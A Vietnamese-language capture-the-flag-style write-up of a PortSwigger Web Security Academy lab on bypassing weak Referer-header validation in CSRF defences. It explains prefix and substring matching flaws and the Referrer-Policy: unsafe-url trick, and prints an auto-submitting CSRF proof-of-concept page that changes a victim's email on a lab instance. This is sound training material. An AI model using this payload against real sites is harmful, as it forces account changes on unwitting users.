# Validation of Referer can be circumvented

Việc xác thực **Referer header** có thể bị bỏ qua nếu web app thực hiện kiểm tra một cách thiếu chặt chẽ. Dưới đây là giải thích chi tiết và ví dụ về cách tấn công này hoạt động:

**1. Trường hợp 1: Kiểm tra tiền tố (prefix) của domain**

**- Cách ứng dụng kiểm tra**: Web app chỉ xác nhận xem domain trong Referer header **bắt đầu bằng** một giá trị mong đợi (ví dụ: **vulnerable-website.com**).

**- Cách tấn công**: Kẻ tấn công có thể tạo một subdomain trên domain của họ, có tên bắt đầu bằng domain mục tiêu. Ví dụ:

*http://vulnerable-website.com.attacker-website.com/csrf-attack*

- Domain thực tế là *attacker-website.com*, nhưng subdomain *vulnerable-website.com* khiến ứng dụng nghĩ rằng Referer hợp lệ (vì nó bắt đầu bằng *vulnerable-website.com*).

**2. Trường hợp 2: Kiểm tra domain có xuất hiện ở bất kỳ đâu trong Referer**

**- Cách web app kiểm tra:** Web app chỉ xác nhận xem domain mục tiêu (ví dụ: *vulnerable-website.com*) **có tồn tại** trong *Referer header* không, bất kể vị trí.

**- Cách tấn công:** Kẻ tấn công đặt domain mục tiêu trong query string hoặc đường dẫn của URL độc hại. Ví dụ:

*http://attacker-website.com/csrf-attack?vulnerable-website.com*

- Referer header sẽ chứa *vulnerable-website.com* trong query string, khiến web app chấp nhận request.

**3. Vấn đề với trình duyệt hiện đại**

- **Cắt bỏ query string**: Nhiều trình duyệt (Chrome, Firefox...) tự động **xóa query string** khỏi Referer header để tránh rò rỉ thông tin nhạy cảm. Điều này có thể khiến kịch bản tấn công trên không hoạt động khi thử nghiệm trực tiếp trên trình duyệt.

- **Giải pháp cho kẻ tấn công**: Đặt header *Referrer-Policy: unsafe-url* trong response chứa mã khai thác. Header này buộc trình duyệt gửi toàn bộ URL (bao gồm cả query string) trong Referer header.

**Ví dụ thực tế:**

- **Bước 1**: Kẻ tấn công tạo trang web độc hại với URL:

    *http://attacker-website.com/csrf-attack?vulnerable-website.com*

- **Bước 2**: Trang web này chứa mã khai thác CSRF và thiết lập header:

    *Referrer-Policy: unsafe-url*

- **Bước 3**: Khi nạn nhân truy cập, trình duyệt gửi Referer đầy đủ:

    *Referer: http://attacker-website.com/csrf-attack?vulnerable-website.com*

- **Bước 4**: Ứng dụng kiểm tra thấy *vulnerable-website.com* trong Referer và cho phép request.

# Lab: CSRF with broken Referer validation
![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-site%20request%20forgery%20(CSRF)/images/image.png?raw=true)

### Web page
![img](1)

### Solution

Login với account được cấp wiener:peter: 

![img](2)

Change email: 

![img](3)

Trong Burp Suite, truy cập HTTP history trong tab Proxy và send change email request tới Repeater: 

![img](4)

Thử thay đổi giá trị của domain trong Referer header: 

![img](5)

Send Request này: 

![img](6)

--> Nhận được response thông báo Invalid referer header.

Thử xóa cả Referer header và Send Request: 

![img](7)

--> Vẫn nhận được thông báo Invalid referer header.

Lần này thử chỉnh sửa Referer header từ *https://0a2000a8033bf69f806226bc00c30061.web-security-academy.net/my-account?id=wiener* thành *https://0a2000a8033bf69f806226bc00c30061.web-security-academy.net*

![img](8)

--> Có thể đổi email --> kiểm tra Referer header không đúng cách.

Thử sửa thành *https://hacked-domain.com/?0a2000a8033bf69f806226bc00c30061.web-security-academy.net* để chỉnh sửa web app làm query param. 

![img](9)

--> Vẫn đổi email thành công --> backend của web app vẫn chấp Referer header bị inject, thay vì xác thực chính xác toàn bộ Referer header, chỉ kiểm tra xem tên domain ở Host header có nằm trong Referer header hay không (bất kỳ vị trí nào). 

--> Cần tạo payload: 

    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
    <script>history.pushState('', '', '/')</script>
        <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="Test@Test.com" />
        <input type="submit" value="Submit request" />
        </form>
        <script>document.forms[0].submit();</script>
    </body>
    </html>

*<script>history.pushState('', '', '/')</script>* Thực hiện thêm 1 mục vào session history stack. Có 3 tham số, tham số đầu tiên là *state object*, tham số thứ hai là *title* và tham số cuối cùng là *the url*. 

Chỉnh tham số thứ 3 thành lab-id, payload sẽ thành như sau: 

    <html>
        <!-- CSRF PoC - generated by Burp Suite Professional -->
        <body>
        <script>history.pushState('', '', '/?0a2c00e60353519981c7709a00c700e7.web-security-academy.net')</script>
            <form action="https://0a2c00e60353519981c7709a00c700e7.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="Test@Test.com" />
            <input type="submit" value="Submit request" />
            </form>
            <script>document.forms[0].submit();</script>
        </body>
        </html>

Go to exploit server và copy payload vào body: 

![img](10)

Store và View exploit. Nhận được thông báo Invalid referer header: 

![img](11)

Điều này là do nhiều trình duyệt hiện đại strip query string từ Referer header theo mặc định như là một biện pháp bảo mật. Để ghi đè hành vi này và đảm bảo rằng URL đầy đủ được bao gồm trong request, thêm header Referrer-Policy: unsafe-url vào phần Head: 

![img](12)

Sửa email trong payload, store và view exploit:

![img](13)

--> Đổi được email. Tiếp tục thay đổi email, store và deliver exploit to victim:

Solved the lab!

![img](14)




